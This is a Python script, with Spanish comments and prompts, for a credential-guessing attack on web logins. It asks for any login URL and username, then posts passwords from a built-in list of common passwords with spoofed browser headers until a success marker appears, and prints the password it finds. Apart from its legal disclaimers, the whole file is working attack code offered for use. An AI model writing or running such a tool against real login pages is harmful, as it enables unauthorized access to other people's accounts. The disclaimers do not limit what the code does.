import requests
import time
from urllib.parse import urlparse

def verificar_url(url):
    """
    Verifica que la URL tenga un formato válido
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def probar_login(url, datos_login, campo_usuario, campo_password, indicador_exitoso):
    """
    Intenta hacer login con las credenciales proporcionadas
    """
    try:
        # Headers para simular un navegador real
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        respuesta = requests.post(
            url, 
            data=datos_login, 
            headers=headers, 
            timeout=10,
            allow_redirects=True
        )
        
        # Verificar si el login fue exitoso
        if indicador_exitoso.lower() in respuesta.text.lower():
            return True, respuesta.status_code
        else:
            return False, respuesta.status_code
            
    except requests.exceptions.Timeout:
        return False, "Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection Error"
    except requests.exceptions.RequestException as e:
        return False, f"Request Error: {e}"
    except Exception as e:
        return False, f"Error: {e}"

def leer_contraseñas(archivo):
    """
    Lee el archivo de contraseñas y retorna una lista
    """
    contraseñas = []
    try:
        with open(archivo, 'r', encoding='utf-8') as file:
            for linea in file:
                contraseña = linea.strip()
                if contraseña:  # Ignorar líneas vacías
                    contraseñas.append(contraseña)
        return contraseñas
    
    except FileNotFoundError:
        print(f"❌ Error: El archivo '{archivo}' no existe.")
        return []
    except Exception as e:
        print(f"❌ Error inesperado al leer el archivo: {e}")
        return []

def crear_archivo_ejemplo():
    """
    Crea un archivo de ejemplo con contraseñas comunes
    """
    contraseñas_ejemplo = """password
123456
12345678
123456789
qwerty
abc123
password1
admin
welcome
holamundo
letmein
monkey
sunshine
password123
admin123
test123
123abc
hello
superman
dragon
baseball"""
    
    try:
        with open('contraseñas.txt', 'w', encoding='utf-8') as file:
            file.write(contraseñas_ejemplo)
        print("✅ Archivo 'contraseñas.txt' creado con contraseñas de ejemplo.")
    except Exception as e:
        print(f"❌ Error al crear archivo de ejemplo: {e}")

def main():
    """
    Función principal del programa
    """
    archivo_contraseñas = 'contraseñas.txt'
    
    print("=" * 60)
    print("           🔐 PROBADOR DE CONTRASEÑAS")
    print("=" * 60)
    print("⚠️  ADVERTENCIA: Este programa es solo para fines educativos")
    print("   y testing de seguridad autorizado. No usar ilegalmente.")
    print("=" * 60)
    
    # Verificar si el archivo de contraseñas existe
    contraseñas = leer_contraseñas(archivo_contraseñas)
    if not contraseñas:
        print("El archivo 'contraseñas.txt' no existe o está vacío.")
        crear = input("¿Desea crear un archivo con contraseñas de ejemplo? (s/n): ").lower()
        if crear == 's':
            crear_archivo_ejemplo()
            contraseñas = leer_contraseñas(archivo_contraseñas)
        else:
            print("Saliendo del programa...")
            return
    
    # Configurar los parámetros del ataque
    print("\n--- CONFIGURACIÓN DEL LOGIN ---")
    
    while True:
        url = input("URL del endpoint de login (ej: https://ejemplo.com/login): ").strip()
        if verificar_url(url):
            break
        print("❌ URL inválida. Asegúrese de incluir http:// o https://")
    
    usuario = input("Nombre de usuario a probar: ").strip()
    campo_usuario = input("Nombre del campo del usuario en el formulario (ej: 'username'): ").strip() or 'username'
    campo_password = input("Nombre del campo de contraseña (ej: 'password'): ").strip() or 'password'
    
    print("\n¿Cómo sabe el programa si el login fue exitoso?")
    print("1. Texto específico en la respuesta (ej: 'Bienvenido')")
    print("2. URL de redirección específica")
    print("3. Código de estado HTTP")
    
    while True:
        try:
            opcion_deteccion = int(input("Seleccione opción (1-3): "))
            if 1 <= opcion_deteccion <= 3:
                break
            print("❌ Opción no válida.")
        except ValueError:
            print("❌ Ingrese un número válido.")
    
    indicador_exitoso = ""
    if opcion_deteccion == 1:
        indicador_exitoso = input("Texto que indica login exitoso (ej: 'Bienvenido'): ").strip()
    elif opcion_deteccion == 2:
        indicador_exitoso = input("URL de redirección exitosa: ").strip()
    else:
        indicador_exitoso = "200"  # Código de estado
    
    # Configurar delay entre intentos
    try:
        delay = float(input("Delay entre intentos (segundos, recomendado 1-5): ") or "2")
    except ValueError:
        delay = 2.0
    
    print(f"\n🔍 Iniciando prueba con {len(contraseñas)} contraseñas...")
    print("⏳ Esto puede tomar varios minutos...")
    print("Presione Ctrl+C para detener\n")
    
    contraseña_encontrada = None
    intentos = 0
    exitosos = 0
    
    try:
        for contraseña in contraseñas:
            intentos += 1
            
            # Preparar datos del formulario
            datos_login = {
                campo_usuario: usuario,
                campo_password: contraseña
            }
            
            print(f"Intentando: {contraseña} ({intentos}/{len(contraseñas)})", end=" ")
            
            # Intentar el login
            exito, estado = probar_login(url, datos_login, campo_usuario, campo_password, indicador_exitoso)
            
            if exito:
                print("✅ ¡ÉXITO! Login correcto")
                contraseña_encontrada = contraseña
                exitosos += 1
                break
            else:
                print(f"❌ Falló (Estado: {estado})")
            
            # Esperar antes del siguiente intento
            time.sleep(delay)
            
    except KeyboardInterrupt:
        print("\n\n⏹️  Prueba interrumpida por el usuario.")
    
    # Mostrar resultados
    print("\n" + "=" * 60)
    print("             📊 RESULTADOS")
    print("=" * 60)
    print(f"Total de intentos: {intentos}")
    print(f"Intentos exitosos: {exitosos}")
    
    if contraseña_encontrada:
        print(f"🎉 ¡CONTRASEÑA ENCONTRADA!: {contraseña_encontrada}")
        print(f"Usuario: {usuario}")
        print(f"Contraseña: {contraseña_encontrada}")
    else:
        print("❌ No se encontró la contraseña en la lista.")
    
    print("=" * 60)

if __name__ == "__main__":
    # Advertencia legal
    print("⚠️  ADVERTENCIA LEGAL:")
    print("Este software es solo para fines educativos y testing de seguridad autorizado.")
    print("El uso no autorizado de este software para acceder a sistemas sin permiso")
    print("es ilegal y puede resultar en consecuencias legales.")
    print()
    
    confirmar = input("¿Entiende y acepta estos términos? (s/n): ").lower()
    if confirmar == 's':
        main()
    else:
        print("Programa terminado.")